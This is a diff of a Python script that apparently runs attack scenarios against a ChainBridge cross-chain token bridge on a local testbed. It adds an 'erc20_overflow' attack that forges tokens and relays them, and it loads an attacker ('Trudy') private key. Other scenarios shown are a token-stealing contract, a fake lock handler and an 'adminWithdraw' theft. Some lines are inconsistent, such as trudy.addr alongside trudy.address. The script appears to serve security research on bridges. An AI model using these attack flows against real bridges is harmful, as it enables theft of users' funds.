@@ -24,10 +24,10 @@ CHAIN1 = ['192.168.1.120', '192.168.1.121', '192.168.1.122', '192.168.1.123']
 CHAIN2 = ['192.168.1.130', '192.168.1.131', '192.168.1.132', '192.168.1.133']
 WAIT = 30
 PKEY_PATH = 'resources/.secret'
+TRUDY_PKEY_PATH = 'resources/.tsecret'
 # The following contracts are malicious versions of chainbridge contracts
 CROSS_COIN_STEALER = "0x217B8B9Dfd8a57ea923092A9E4Ed5682718339ea"
 FAKE_LOCK_HANDLER = "0xb355b0b2c88d0333B77d2D641663AF7888DC26BD"
-TRUDY_ADDR = '0xD9635866Ade8E73Cc8565921F7CF95f5Be8f6D3e'
 
 
 def block_connections(endpoints: List[str]):
@@ -152,7 +152,7 @@ def transfer_conn_lock_back(mint: bool = False):
 
 def transfer_crosscoin_stealer(mint: bool = False):
     logging.info("Erc20 transfer. Bad erc20 contract on dest chain.")
-    # The owner of the bridge registers a contract wich steals user's tokens
+    # The owner of the bridge registers a contract wich steals user's tokens.
     contracts = available_contracts(n1.chain_id, ContractTypes.ERC20)
     res_id = available_resources(n1.chain_id, contracts['target'].id)
     cb.register_resource(n1.node_endpoint, acc.key.hex(), 100000,
@@ -168,7 +168,7 @@ def transfer_crosscoin_stealer(mint: bool = False):
     time.sleep(WAIT)
     # Trudy address should increase, user shouldn't have tokens
     cb.balance(n1.node_endpoint, ContractTypes.ERC20,
-               TRUDY_ADDR, CROSS_COIN_STEALER)
+               trudy.address, CROSS_COIN_STEALER)
     cb.balance(n1.node_endpoint, ContractTypes.ERC20,
                acc.address, CROSS_COIN_STEALER)
     # Test finished, unblock and restore old bridge
@@ -209,6 +209,28 @@ def fakelock_attack(mint=False):
     unblock_connections(CHAIN0[1:])
     cb.register_resource(n0.node_endpoint, acc.key.hex(), 100000,
                          contracts['bridge'].address, contracts['handler'].address, res_id, contracts['target'].address)
+
+
+def erc20_overflow(mint: bool = False):
+    logging.info("Starting erc20 overflow attack.")
+    contracts = available_contracts(
+        n0.chain_id, ContractTypes.ERC20)
+    # Forging tokens on source (not the main chain)
+    redeem_tokens(n1.provider, trudy, n1.provider.toWei(
+        1, "Ether"), ContractTypes.ERC20_HANDLER)
+    # Trudy balance before the overflow attack on source chain
+    cb.balance(n0.node_endpoint, ContractTypes.ERC20,
+               trudy.address, contracts['target'].address)
+    simple_token_transfer(1, ContractTypes.ERC20, n1, n0, mint)
+    # Moving forged tokens on source chain
+    cb.start_relay()
+    time.sleep(WAIT)
+    # Balance on dest
+    cb.balance(n0.node_endpoint, ContractTypes.ERC20,
+               trudy.address, contracts['target'].address)
+    # Balance on source handler
+    cb.balance(n0.node_endpoint, ContractTypes.ERC20,
+               contracts['handler'].address, contracts['target'].address)
 
 
 def malicious_rollback(mint: bool = False):
@@ -265,7 +287,7 @@ def concussion_attack(mint: bool = False):
     contracts = available_contracts(n0.chain_id, ContractTypes.ERC20)
     # Trudy address before the steal
     cb.balance(n0.node_endpoint, ContractTypes.ERC20,
-               TRUDY_ADDR, contracts['target'].address)
+               trudy.address, contracts['target'].address)
     # Tokens bridged whose ownership is of the handler
     cb.balance(n0.node_endpoint, ContractTypes.ERC20,
                contracts['handler'].address, contracts['target'].address)
@@ -277,7 +299,7 @@ def concussion_attack(mint: bool = False):
     ''' The new bridge implementation changed format for function params
     target = n0.provider.toBytes(
         hexstr=contracts['target'].address).rjust(32, b'\0')
-    trudy = n0.provider.toBytes(hexstr=TRUDY_ADDR).rjust(32, b'\0')
+    trudy = n0.provider.toBytes(hexstr=trudy.address).rjust(32, b'\0')
     amount = n0.provider.toBytes(primitive=amount).rjust(32, b'\0')
     data = target + trudy + amount
     tx = contract.functions.adminWithdraw(
@@ -288,7 +310,7 @@ def concussion_attack(mint: bool = False):
               "gasPrice": n0.provider.toWei(10, "gwei"),
               "gas": 1000000}
     tx = contract.functions.adminWithdraw(
-        contracts['handler'].address, contracts['target'].address, TRUDY_ADDR,
+        contracts['handler'].address, contracts['target'].address, trudy.addr,
         amount).buildTransaction(t_dict)
     signed_tx = n0.provider.eth.account.sign_transaction(tx, acc.key)
     tx_hash = n0.provider.eth.send_raw_transaction(
@@ -297,7 +319,7 @@ def concussion_attack(mint: bool = False):
     time.sleep(WAIT)
     # Trudy balance after the adminWithdraw
     cb.balance(n0.node_endpoint, ContractTypes.ERC20,
-               TRUDY_ADDR, contracts['target'].address)
+               trudy.address, contracts['target'].address)
     # Tokens bridged balance after withdraw
     cb.balance(n0.node_endpoint, ContractTypes.ERC20,
                contracts['handler'].address, contracts['target'].address)
@@ -312,9 +334,14 @@ def tests():
     # transfer_conn_lock_back()
     # transfer_crosscoin_stealer()
     # fakelock_attack()
-    # TODO: Fakelock all'indietro non dovrebbe poter generare fondi perche` non sono stati sbloccati
+    erc20_overflow()
+    '''TODO: Una volta spostati fondi senza averli bloccati, lo spostamento
+    all'indietro non dovrebbe funzionare in quanto non sono mai stati bloccati.
+    Questo pero` non e` garantito perche` potrei andare a sbloccare fondi di
+    altri utenti, intascandomeli.'''
     # malicious_rollback()
-    concussion_attack()
+    # concussion_attack()
+
     logging.info("Finished tests.")
 
 
@@ -329,6 +356,10 @@ if __name__ == "__main__":
         key = f.readline().strip()
     acc = n0.provider.eth.account.from_key(key)
     logging.info("Imported account:" + acc.address)
+    with open(TRUDY_PKEY_PATH) as f:
+        key = f.readline().strip()
+    trudy = n0.provider.eth.account.from_key(key)
+    logging.info("Imported account:" + trudy.address)
     # Configuring wrappers for commands execution
     cb = CBWrapper()
     ufw = UFW()
